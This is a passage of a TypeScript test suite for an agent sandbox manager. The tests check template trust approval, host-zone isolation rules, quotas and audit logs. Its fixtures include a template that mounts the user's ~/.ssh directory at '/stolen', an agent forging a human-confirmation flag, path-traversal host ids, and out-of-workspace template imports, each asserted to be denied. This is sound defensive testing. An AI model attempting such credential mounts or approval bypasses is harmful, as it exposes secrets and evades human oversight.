    const req = (): Parameters<Ctx['abox']['createSandbox']>[1] => ({
      template: 'e2e-proj',
      workspace: { mode: 'empty' },
      projectDir: fx.trustapp,
    });

    it('a template from a repository is untrusted until a human approved its exact content', async () => {
      const list = (await ctx.abox.listTemplates(A, { projectDir: fx.trustapp })).templates.find(
        (t) => t.name === 'e2e-proj',
      );
      expect(list).toMatchObject({ trusted: false, source: { kind: 'project' } });
      const p = await ctx.abox.createSandbox(A, req(), { waitForApprovalMs: 0 });
      expect(p.status).toBe('pending_approval');
      if (p.status !== 'pending_approval') return;
      expect(p.kind).toBe('template_trust');
      await ctx.abox.approve(HUMAN, p.approvalId, 'looked at the diff');
      expect(
        (await ctx.abox.listTemplates(A, { projectDir: fx.trustapp })).templates.find(
          (t) => t.name === 'e2e-proj',
        )?.trusted,
      ).toBe(true);
      const done = await ctx.abox.createSandbox(A, req(), { waitForApprovalMs: 0 });
      expect(done.status).toBe('created');
      if (done.status === 'created') ctx.created.push(done.sandbox.id);
    }, 120_000);

    it('changing the file (even one comment) asks again; restoring the approved content is trusted again', async () => {
      const original = readFileSync(tpl(), 'utf8');
      writeFileSync(tpl(), `${original}# sneaky change\n`);
      try {
        expect(
          (await ctx.abox.listTemplates(A, { projectDir: fx.trustapp })).templates.find(
            (t) => t.name === 'e2e-proj',
          )?.trusted,
        ).toBe(false);
        const p = await ctx.abox.createSandbox(A, req(), { waitForApprovalMs: 0 });
        expect(p.status).toBe('pending_approval');
        if (p.status === 'pending_approval') expect(p.kind).toBe('template_trust');
        // a change that matters (more memory) is of course also a new question
        writeFileSync(tpl(), original.replace('memory: 256m', 'memory: 512m'));
        const q = await ctx.abox.createSandbox(A, req(), { waitForApprovalMs: 0 });
        expect(q.status).toBe('pending_approval');
      } finally {
        writeFileSync(tpl(), original);
      }
      expect(
        (await ctx.abox.listTemplates(A, { projectDir: fx.trustapp })).templates.find(
          (t) => t.name === 'e2e-proj',
        )?.trusted,
      ).toBe(true);
    }, 120_000);

    it('a human confirmation (--yes) creates from an untrusted template once but does not record trust', async () => {
      const dir = join(env.projects, 'trust2');
      mkdirSync(join(dir, '.sandbox'), { recursive: true });
      writeFileSync(
        join(dir, '.sandbox', 'e2e-proj.yaml'),
        PROJECT_TEMPLATE('labels: { variant: two }\n'),
      );
      const pending = await ctx.abox.createSandbox(HUMAN, {
        template: 'e2e-proj',
        workspace: { mode: 'empty' },
        projectDir: dir,
      });
      expect(pending.status).toBe('confirmation_required');
      const c = await ctx.create(HUMAN_YES, {
        template: 'e2e-proj',
        workspace: { mode: 'empty' },
        projectDir: dir,
      });
      expect(c.sandbox.state).toBe('running');
      expect(
        (await ctx.abox.listTemplates(HUMAN, { projectDir: dir })).templates.find(
          (t) => t.name === 'e2e-proj',
        )?.trusted,
      ).toBe(false);
      await ctx.abox.removeSandbox(HUMAN, c.sandbox.id);
      ctx.created.splice(ctx.created.indexOf(c.sandbox.id), 1);
    }, 120_000);

    it('trust does not outrank policy: a trusted-looking template that mounts ~/.ssh is denied at once, nothing queued', async () => {
      const r = (await errorOf(
        ctx.abox.createSandbox(
          A,
          { template: 'e2e-evil', workspace: { mode: 'empty' }, projectDir: fx.hostile },
          { waitForApprovalMs: 0 },
        ),
      )) as AboxError;
      expect(['policy_denied', 'template_invalid'], `${r.code}: ${r.message}`).toContain(r.code);
      expect(r.message + JSON.stringify(r.issues)).toMatch(
        /ssh|forbidden|mount|root|home|~|credential/i,
      );
      // the same with an absolute path instead of ~: the path policy must be what refuses it
      writeFileSync(
        join(fx.hostile, '.sandbox', 'e2e-evil.yaml'),
        PROJECT_TEMPLATE(
          `mounts:\n  - { source: '${join(env.home, '.ssh')}', target: /stolen, access: ro }\n`,
          'e2e-evil',
        ),
      );
      const r2 = (await errorOf(
        ctx.abox.createSandbox(
          A,
          { template: 'e2e-evil', workspace: { mode: 'empty' }, projectDir: fx.hostile },
          { waitForApprovalMs: 0 },
        ),
      )) as AboxError;
      expect(['policy_denied', 'template_invalid'], `${r2.code}: ${r2.message}`).toContain(r2.code);
      expect(r2.message).toMatch(/ssh|credential/i);
      expect(
        (await ctx.abox.listApprovals(A, { status: 'pending' })).some((a) =>
          JSON.stringify(a.request).includes('e2e-evil'),
        ),
      ).toBe(false);
      // validateTemplate tells the author why
      const v = await ctx.abox.validateTemplate(A, 'e2e-evil', { projectDir: fx.hostile });
      expect(v.policy?.decision).toBe('deny');
    });

    it('a repository template that shadows a BUILTIN name (alpine-min) is untrusted too, so it cannot replace the trusted one silently', async () => {
      const r = await ctx.abox.createSandbox(
        A,
        { template: 'alpine-min', workspace: { mode: 'copy', path: fx.hostile } },
        { waitForApprovalMs: 0 },
      );
      expect(r.status, 'a project template silently replaced the builtin one').toBe(
        'pending_approval',
      );
      if (r.status === 'pending_approval') {
        expect(r.kind).toBe('template_trust');
        await ctx.abox.deny(HUMAN, r.approvalId);
      }
    });

    it('agents cannot point projectDir outside their workspace roots to import foreign templates', async () => {
      const outside = join(env.root, 'outside-project');
      mkdirSync(join(outside, '.sandbox'), { recursive: true });
      writeFileSync(join(outside, '.sandbox', 'e2e-proj.yaml'), PROJECT_TEMPLATE());
      const e = (await errorOf(
        ctx.abox.createSandbox(
          A,
          { template: 'e2e-proj', workspace: { mode: 'empty' }, projectDir: outside },
          { waitForApprovalMs: 0 },
        ),
      )) as AboxError;
      expect(['not_found', 'policy_denied', 'invalid_input']).toContain(e.code);
      expect(e.code).not.toBe('pending_approval');
    });
  });

  // =================================================================================================================
  describe('remote / host rules testable locally (host resolver stub)', () => {
    let w: Env;
    let c: Ctx;
    const HA: Caller = { contextId: 'agent-hosts' };
    const resolver: HostResolver = (hostId) => {
      const local = (
        zone: 'workstation' | 'lab' | 'shared' | 'restricted',
        extra: Record<string, unknown> = {},
      ) =>
        Promise.resolve({
          connection: { host: hostId, kind: 'local' as const },
          zone,
          backends: ['docker' as const],
          ...extra,
        });
      switch (hostId) {
        case 'local':
          return local('workstation', { backends: ['docker', 'process'] });
        case 'other':
          return local('lab');
        case 'shared-box':
          return local('shared');
        case 'vault':
          return local('restricted');
        case 'limited':
          return local('lab', { limits: { sandboxes: 1 } });
        case 'picky':
          return local('lab', { minIsolation: 'vm' });
        default:
          return Promise.reject(new AboxError('not_found', `unknown host ${hostId}`));
      }
    };

    beforeAll(async () => {
      w = makeEnv();
      // `shared-box` pretends to deliver `hardened` isolation (a stand-in for gVisor/Kata); the other hosts are plain runc
      c = await openAbox(w, {
        instance: 'hostsuite',
        hostResolver: resolver,
        providers: {
          docker: (h) => {
            const p = dockerProvider({ instance: 'hostsuite', host: h });
            if (h.host !== 'shared-box') return p;
            return new Proxy(p, {
              get(t, prop) {
                if (prop === 'isolation') return 'hardened';
                if (prop === 'capabilities')
                  return () => ({ ...t.capabilities(), isolation: 'hardened' });
                const v = Reflect.get(t, prop, t) as unknown;
                return typeof v === 'function' ? (v as (...a: unknown[]) => unknown).bind(t) : v;
              },
            });
          },
        },
      });
      await c.abox.buildTemplate(HUMAN, 'alpine-min');
    }, 180_000);
    afterAll(async () => {
      await c?.close();
      w?.cleanup();
    });

    it('an agent cannot use a host that is not in its context (sandbox_create host=other) - denied and audited', async () => {
      const err = (await errorOf(
        c.abox.createSandbox(
          A,
          { template: 'alpine-min', workspace: { mode: 'empty' }, host: 'other' },
          { waitForApprovalMs: 0 },
        ),
      )) as AboxError;
      expect(err.code).toBe('policy_denied');
      expect(err.message).toContain('other');
      const audit = await c.abox.queryAudit(HUMAN, { action: 'sandbox.create', decision: 'deny' });
      expect(
        audit.some(
          (e) => e.actor === 'agent:agent-a' && JSON.stringify(e.details).includes('other'),
        ),
      ).toBe(true);
      // malformed host ids are input errors
      for (const host of ['LOCAL', '../x', 'local/../other', 'a b', '']) {
        expect(
          await errorOf(
            c.abox.createSandbox(
              A,
              { template: 'alpine-min', workspace: { mode: 'empty' }, host },
              { waitForApprovalMs: 0 },
            ),
          ),
          host,
        ).toMatchObject({ code: expect.stringMatching(/invalid_input|policy_denied/) });
      }
    });

    it('a shared-zone host demands at least `hardened` isolation: plain containers are denied, even for a human', async () => {
      const pw = makeEnv();
      const plain = await openAbox(pw, { hostResolver: resolver });
      try {
        for (const caller of [HA, HUMAN_YES]) {
          const err = (await errorOf(
            plain.abox.createSandbox(
              caller,
              { template: 'alpine-min', workspace: { mode: 'empty' }, host: 'shared-box' },
              { waitForApprovalMs: 0 },
            ),
          )) as AboxError;
          expect(err.code, caller.contextId).toBe('policy_denied');
          expect(err.message).toMatch(/hardened|isolation/);
        }
      } finally {
        await plain.close();
        pw.cleanup();
      }
    });

    it('with `hardened` isolation a shared host still needs an approval (host_zone), then works', async () => {
      const req = {
        template: 'alpine-min',
        workspace: { mode: 'empty' as const },
        host: 'shared-box',
      };
      const p = await c.abox.createSandbox(HA, req, { waitForApprovalMs: 0 });
      expect(p.status).toBe('pending_approval');
      if (p.status !== 'pending_approval') return;
      expect(p.reasons.join(' ')).toMatch(/shared/i);
      // a human confirmation flag cannot be smuggled in by the agent
      const smuggled = await c.abox.createSandbox(
        { contextId: 'agent-hosts', humanConfirmed: true },
        req,
        { waitForApprovalMs: 0 },
      );
      expect(smuggled.status).toBe('pending_approval');
      await c.abox.approve(HUMAN, p.approvalId);
      const done = await c.abox.createSandbox(HA, req, { waitForApprovalMs: 0 });
      expect(done.status).toBe('created');
      if (done.status === 'created') {
        expect(done.sandbox.host).toBe('shared-box');
        await c.abox.removeSandbox(HA, done.sandbox.id);
      }
    }, 120_000);

    it('a restricted-zone host only takes `vm` isolation, a host with min_isolation=vm too: containers are denied', async () => {
      for (const host of ['vault', 'picky']) {
        const err = (await errorOf(
          c.abox.createSandbox(
            HA,
            { template: 'alpine-min', workspace: { mode: 'empty' }, host },
            { waitForApprovalMs: 0 },
          ),
        )) as AboxError;
        expect(err.code, host).toBe('policy_denied');
        expect(err.message, host).toMatch(/vm|isolation/);
      }
    });

    it('host quotas hold: a host limited to one sandbox refuses the second', async () => {
      const first = await c.create(HA, {
        template: 'alpine-min',
        workspace: { mode: 'empty' },
        host: 'limited',
      });
      const err = (await errorOf(
        c.abox.createSandbox(
          HA,
          { template: 'alpine-min', workspace: { mode: 'empty' }, host: 'limited' },
          { waitForApprovalMs: 0 },
        ),
      )) as AboxError;
      expect(err.code).toBe('policy_denied');
      expect(err.message).toMatch(/limited|host|sandbox/i);
      await c.abox.removeSandbox(HA, first.sandbox.id);
      c.created.splice(c.created.indexOf(first.sandbox.id), 1);
    }, 120_000);

    it('agents have no way to read or change host profiles through the manager', async () => {
      // The Abox facade exposes no host-profile operation (HostRegistry is CLI/GUI only, see
      // core/src/hosts/README.md). The one host-related method is the human-only, read-only
      // capacity report, and an agent calling it is refused.
      const methods = Object.getOwnPropertyNames(Object.getPrototypeOf(c.abox)).filter((m) =>
        /host|ssh|tunnel/i.test(m),
      );
      expect(methods).toEqual(['hostCapacity']);
      const err = (await c.abox.hostCapacity(HA, 'local').catch((e: unknown) => e)) as AboxError;
      expect(err.code).toBe('policy_denied');
    });
  });
});
